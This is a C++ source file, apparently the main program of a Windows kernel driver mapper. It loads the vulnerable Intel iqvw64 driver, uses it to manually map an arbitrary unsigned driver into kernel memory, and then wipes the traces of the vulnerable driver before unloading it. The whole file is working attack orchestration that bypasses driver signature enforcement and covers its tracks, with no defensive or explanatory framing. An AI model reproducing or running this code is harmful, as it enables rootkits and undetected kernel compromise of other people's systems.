#include <utils/fs_utils.hpp>

#include <vuln/drivers/basic_vuln_driver.hpp>
#include <vuln/drivers/iqvw64_driver.hpp>
#include <vuln/vuln_driver_loader.hpp>

#include <kernel/k32_context.hpp>
#include <kernel/k32_module.hpp>
#include <kernel/k32_parser.hpp>

#include <mapper/driver_mapper.hpp>

#include <vuln/vuln_trace_cleaner.hpp>

#include <filesystem>

#include <spdlog/spdlog.h>

int main(int argc, char** argv)
{
    spdlog::set_level(spdlog::level::trace);

    if (argc != 2) {
        spdlog::error("Usage: {} <driver_path>", std::filesystem::path(argv[0]).filename().string());
        return EXIT_FAILURE;
    }

    std::filesystem::path driverPath = argv[1];
    if (!std::filesystem::exists(driverPath)) {
        spdlog::error("File not found: {}", driverPath.string());
        return EXIT_FAILURE;
    }

    const auto driverBytes = Utils::FS::ReadBytesFromFile(driverPath);
    if (driverBytes.empty()) {
        spdlog::error("Failed to read driver bytes from file");
        return EXIT_FAILURE;
    }

    if (!VulnDriverLoader::EnableLoadPrivileges()) {
        spdlog::error("Failed to allow load privileges");
        return EXIT_FAILURE;
    }

    const auto iqvw64 = std::make_shared<Iqvw64Driver>("\\\\.\\Nal");

    VulnDriverLoader driverLoader = VulnDriverLoader(iqvw64);
    if (!driverLoader.Load()) {
        spdlog::error("Failed to load vulnerable driver");
        return EXIT_FAILURE;
    }

    auto k32Module = std::make_shared<K32Module>(*iqvw64, "ntoskrnl.exe");
    auto k32ctx = std::make_shared<K32Context>(iqvw64, k32Module);

    DriverMapper driverMapper(k32ctx, k32Module);
    if (!driverMapper.Map((void*)driverBytes.data())) {
        spdlog::error("Failed to manual mapping the driver");
        return EXIT_FAILURE;
    }

    VulnTraceCleaner vulnTraceCleaner(k32ctx, k32Module);
    if (!vulnTraceCleaner.Cleanup()) {
        spdlog::error("Failed to cleanup vulnerable driver traces");
        return EXIT_FAILURE;
    }

    if (!driverLoader.Unload()) {
        spdlog::error("Failed to unload vulnerable driver");
        return EXIT_FAILURE;
    }

    spdlog::info("Program has successfully completed its execution");
    return EXIT_SUCCESS;
}